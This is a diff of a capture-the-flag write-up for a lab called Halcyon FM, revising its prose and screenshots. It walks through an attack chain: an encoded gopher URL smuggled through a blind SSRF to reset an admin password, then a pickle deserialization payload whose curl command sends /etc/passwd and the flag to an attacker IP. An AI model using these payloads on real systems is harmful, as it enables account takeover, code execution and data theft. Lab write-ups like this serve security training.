@@ -1,9 +1,13 @@
 ---
 title: Halcyon FM
 date: 2026-10-16 07:00:00 +0100
-categories: [Webverse, SSRF]
-tags: [ssrf, gopher, pickle, deserialization, blind-ssrf]
+categories: [SSRF, gopher, RCE]
+image:
+  path: /assets/halcyon.webp
 ---
+
+**Platform:** https://dashboard.webverselabs-pro.com
+**Lab:** https://dashboard.webverselabs-pro.com/labs/halcyonfm
 
 ## Briefing
 
@@ -127,11 +131,12 @@ Four accounts came back:
 
 ## Password reset through blind SSRF
 
-The change-password endpoint doesn't ask for the current password, which is the whole leverage here. The catch: it's a `POST` with a `new_password` parameter, which the `import-preview` SSRF can't drive directly over plain HTTP, since it only fetches a single URL.
+The change-password endpoint doesn't ask for the current password, which is the whole leverage here. But there's a problem here, it's a `POST` with a `new_password` parameter, which the `import-preview` SSRF can't drive directly over plain HTTP, since it only fetches a single URL.
 
-Trying the `gopher://` scheme on the internal fetch got rejected outright:
+Trying the `gopher://` scheme on the internal fetch got rejected by the server:
 
-![Burp showing gopher scheme rejected with adapter error](/assets/img/posts/halcyon-fm/09-gopher-rejected.png)
+<img width="1294" height="307" alt="image" src="https://github.com/user-attachments/assets/5cb37506-7eba-4426-948a-d6c2e9e145be" />
+
 
 ```json
 {"error":"No connection adapters were found for 'gopher://127.0.0.1:8080/api/v1/1/change-password'","message":"not reachable","reachable":false,"status":0,"url":"gopher://127.0.0.1:8080/api/v1/1/change-password"}
@@ -139,17 +144,19 @@ Trying the `gopher://` scheme on the internal fetch got rejected outright:
 
 That's the literal error Python's `requests` library throws when it hits a scheme it has no adapter for, which confirms the `feed_url` fetcher is using `requests` directly and gopher isn't supported there.
 
-The third endpoint from the swagger spec, `stream-probe`, takes its own `stream_url` parameter and is meant to check whether a stream mount is reachable. Testing it with an arbitrary external URL came back clean:
+The third endpoint from the swagger spec, `stream-probe`, takes its own `stream_url` parameter and is meant to check whether a stream mount is reachable. I tested it with an arbitrary external URL and it came back without any error:
 
-![Burp showing stream-probe test against an external URL](/assets/img/posts/halcyon-fm/10-stream-probe-external.png)
+<img width="1295" height="351" alt="image" src="https://github.com/user-attachments/assets/71a63ce2-707f-4810-8364-ac0daca60c4a" />
+
 
 ```json
 {"result":"000 0.003448s","stream_url":"http://test.com","content_type":"application/json","message":"reachable","reachable":true,"status":200,"url":"..."}
 ```
 
-No error, so this second fetcher is a different implementation, one that's worth testing against the internal API itself:
+No error, so this second fetcher is a different implementation, I moved on to test it against the internal api and try it with a gopher scheme:
 
-![Burp showing stream-probe pointed at an internal gopher URL](/assets/img/posts/halcyon-fm/11-stream-probe-gopher.png)
+<img width="1293" height="329" alt="image" src="https://github.com/user-attachments/assets/a2a38391-c1c0-41ad-8e00-cc13f0138d62" />
+
 
 ```json
 {"stream_url":"gopher://127.0.0.1:8080","reachable":true,"status":200}
@@ -157,15 +164,16 @@ No error, so this second fetcher is a different implementation, one that's worth
 
 Gopher is accepted here. That gives a path to smuggle an arbitrary raw TCP payload, including a crafted HTTP request, at the internal API through the stream-probe fetcher.
 
-Gopher URL, built to send a raw `POST /api/v1/1/change-password?new_password=Password123!` to the internal service:
+I then constructed a gopher URL to send a raw `POST /api/v1/1/change-password?new_password=Password123!` to the internal api service:
 
 ```
 gopher%3A%2F%2F127.0.0.1%3A8080%2F_POST%2520%252Fapi%252Fv1%252F1%252Fchange-password%253Fnew_password%253DPassword123%2521%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A8080%250D%250AContent-Length%253A%25200%250D%250AConnection%253A%2520close%250D%250A%250D%250A
 ```
 
-![Burp showing the gopher payload sent through stream-probe](/assets/img/posts/halcyon-fm/12-gopher-payload.png)
+<img width="1289" height="417" alt="image" src="https://github.com/user-attachments/assets/2a9b9d5b-a2fd-4c24-a3f4-77c25e06ef47" />
 
-Chained through `stream-probe` as the `stream_url`, this went through without error, and the credentials below worked on the studio login:
+
+Chained through `stream-probe` as the `stream_url`, the request went through without error.
 
 ```
 mfaro : Password123!
@@ -173,16 +181,21 @@ mfaro : Password123!
 
 ## Accessing the studio subdomain
 
-![Studio login page](/assets/img/posts/halcyon-fm/13-studio-login.png)
+From our vhost scan earier, we found a `studio` subdomain. Accessing it directly brings a login page.
 
-`studio.halcyonfm.local/login` is the Playout & Automation Console. Logging in as `mfaro` drops straight into the admin dashboard.
+<img width="1151" height="669" alt="image" src="https://github.com/user-attachments/assets/6c3b389a-3e45-40e8-9817-d9e91ea8db6c" />
 
-![Admin dashboard showing playout console and import playlist feature](/assets/img/posts/halcyon-fm/14-dashboard.png)
+
+`studio.halcyonfm.local/login` is the Playout & Automation Console. Logging in as `mfaro` drops me straight into the admin dashboard.
+
+<img width="1460" height="783" alt="image" src="https://github.com/user-attachments/assets/0f3dcf0b-c898-4a9e-a4d8-9f6f26825b6a" />
+
+
 _On-air status, playout schedule, and an "Import playlist" feature that loads a .phl automation bundle, with a sample available via the export link_
 
 ## Pickle deserialization to RCE
-
-Pulled the sample bundle and decoded it:
+The dashboard shows a playout console which different recorded sessions, a functionality to upload a load a saved .phl automation bundle. Theres also a sample `.hpl` file I can download with the export link.
+I pulled the sample bundle and decoded it:
 
 ```
 ~> /webverse/halcyon cat ~/Downloads/overnight.hpl
@@ -192,15 +205,17 @@ gASVVwAAAAAAAAB9lCiMBG5hbWWUjBFPdmVybmlnaHQgQW1iaWVudJSMBnRyYWNrc5RdlCiMCWludHJv
 ��W}�(�name��Overnight Ambient��tracks�]�(intro-bed field-01 drone-02 loop�u.
 ```
 
-The `.hpl` file is base64-encoded, and the decoded bytes start with the standard pickle protocol magic. The "Import bundle" feature deserializes whatever `.phl`/`.hpl` file gets uploaded, which means arbitrary code execution via `__reduce__`.
+The `.hpl` file is base64-encoded, and the decoded bytes start with the standard pickle protocol magic. The "Import bundle" feature deserializes whatever `.hpl` file gets uploaded, which can lead to arbitrary code execution via `__reduce__`.
 
-SSH wasn't exposed on this box, so a reverse shell was off the table, but the server can make outbound HTTP requests, which is enough to exfiltrate command output via curl.
+SSH wasn't exposed on this box, so I ruled out trying to getting a reverse shell, but the server can make outbound HTTP requests, which is enough to exfiltrate command output via curl. To test this, I tried to cat `/etc/passwd` file.
 
-Listener on my machine:
+I set up a listener on my machine:
 
 ```
 nc -lvnp 8000
 ```
+
+And wrote a python script that builds a pickle which curls the file back to me.
 
 Payload (`rev.py`):
 
@@ -216,7 +231,7 @@ with open('evil.hpl', 'w') as f:
     f.write(base64.b64encode(pickle.dumps(E())).decode())
 ```
 
-Uploading `evil.hpl` through the import bundle feature hung the request. Checking the listener:
+Uploading `evil.hpl` through the import bundle feature made the request to hang. Then I went back to check my listener
 
 ```
 → /webverse/halcyon nc -lvnp 8000
@@ -233,7 +248,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 halcyon:x:1001:1001::/home/halcyon:/bin/bash
 ```
 
-Code execution confirmed. Swapped the `cmd` in `rev.py` to cat the flag instead and reuploaded:
+Code execution is confirmed, so I swapped the value of `cmd` in `rev.py` to cat the flag and reuploaded:
 
 ```
 cmd = 'curl http://10.8.0.148:8000/ -d "$(cat /home/halcyon/flag.txt)"'
@@ -249,8 +264,6 @@ POST / HTTP/1.1
 WEBVERSE{p1ckl3d_th3_...}
 ```
 
-## Summary
+Happy Hacking !!!!!!!!!!!
 
-Full chain: an authenticated-looking "dev mode" flag on a public preview endpoint that leaked full response bodies → SSRF to an internal admin API discovered via its own `swagger.json` → a second, gopher-capable fetcher on a "harmless" diagnostics endpoint used to smuggle a raw POST into an unauthenticated password-reset endpoint → admin login to the playout console → unsafe pickle deserialization in the bundle-import feature for RCE.
 
-Each step was individually low-severity on its own (an info leak, an SSRF with no obvious internal target, a password-reset endpoint with no auth check, a "trusted" file-import feature); chained together they add up to full remote code execution as the `halcyon` user. Worth flagging in the recommendations: the `requests`-based fetcher that rejected gopher wasn't actually the control that mattered, since the second fetcher behind stream-probe supported it anyway. SSRF filtering needs to be consistent across every outbound fetch path in an application, not just the obvious one.
